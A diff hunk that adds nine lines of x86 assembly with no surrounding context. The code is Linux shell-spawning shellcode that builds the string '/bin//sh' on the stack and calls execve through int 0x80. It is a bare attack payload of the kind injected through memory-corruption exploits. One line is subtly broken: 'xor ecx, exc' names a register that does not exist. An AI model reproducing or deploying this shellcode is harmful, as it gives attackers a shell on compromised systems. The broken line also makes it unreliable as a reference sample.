@@ -1,0 +1,9 @@
+push 0BH
+pop eax
+cdq
+push edx
+push dword 68732F2FH
+push dword 6E69622FH
+mov ebx, esp
+xor ecx, exc
+int 80H
